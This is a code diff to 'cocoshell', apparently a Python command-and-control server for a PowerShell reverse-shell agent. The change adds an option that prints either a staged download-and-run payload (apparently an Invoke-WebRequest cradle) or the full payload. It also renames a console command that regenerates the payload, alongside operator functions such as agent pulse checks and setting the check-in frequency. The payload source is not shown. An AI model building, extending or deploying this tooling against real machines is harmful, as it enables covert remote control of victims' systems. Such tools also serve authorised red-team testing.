@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 import subprocess, time, sqlite3, argparse, os, sys, random, string, requests, datetime
 from os.path import exists
-from core.payload import generate
+from core.payload import *
 from core.log import Log
 
 parser = argparse.ArgumentParser(
@@ -17,6 +17,7 @@ parser.add_argument("-f", "--frequency", help="the amount of seconds the agent w
 parser.add_argument("-r", "--route", help="the api endpoint the agent will connect to")
 parser.add_argument("-v", "--verbose", help="debug messages will be printed to the console", action="store_true")
 parser.add_argument("-t", "--timeout", help="the amount of seconds after which a command is cancelled (default: 30)", type=int)
+parser.add_argument("--unstaged", help="this will print the full payload instead of the staged one", action="store_true")
 args, leftovers = parser.parse_known_args()
 
 letters = string.ascii_lowercase
@@ -47,7 +48,7 @@ except FileNotFoundError:
         f.write('')
     api_log = open("logs/cocoshell_api.log", "a+")
 
-proc = subprocess.Popen(["python3", "core/api.py", "-r", route], stdout=api_log)
+proc = subprocess.Popen(["python3", "core/api.py", "-r", route, "-u", agent_url, "-f", str(frequency)], stdout=api_log)
 logger.info(f"Cocoshell API started on {api_url}")
 logger.info(f"Agent will connect to {agent_url}")
 logger.debug("Connecting to database")
@@ -55,7 +56,12 @@ time.sleep(2.0)
 con = sqlite3.connect("cocoshell.db", check_same_thread=False)
 cur = con.cursor()
 logger.debug("Connected")
-logger.payload(generate(agent_url, frequency))
+logger.debug(f"the payload will be printed unstaged: {args.unstaged}")
+
+if args.unstaged:
+    logger.payload(generate_payload(agent_url, frequency))
+else:
+    logger.payload(generate_iwr(agent_url))
 
 waiting_for_result = False
 result = None
@@ -71,7 +77,7 @@ def print_help():
         '''
         \r  Command         Description
         \r  help            print this message
-        \r  generate        regenerate the powershell payload and print it to console
+        \r  raw             regenerate the powershell payload and print it to console
         \r  pulse           check when the agent last checked in
         \r  set-frequency   set the time between requests from the agent
         \r  exit-agent      stop the connected agent
@@ -169,8 +175,8 @@ try:
         if (command == "help"):
             not_implemented()
             waiting_for_result = False
-        if (command == "generate"):
-            generate(agent_url)
+        if (command == "raw"):
+            generate_payload(agent_url, frequency)
             waiting_for_result = False
         if (command == "exit-agent"):
             waiting_for_result = False
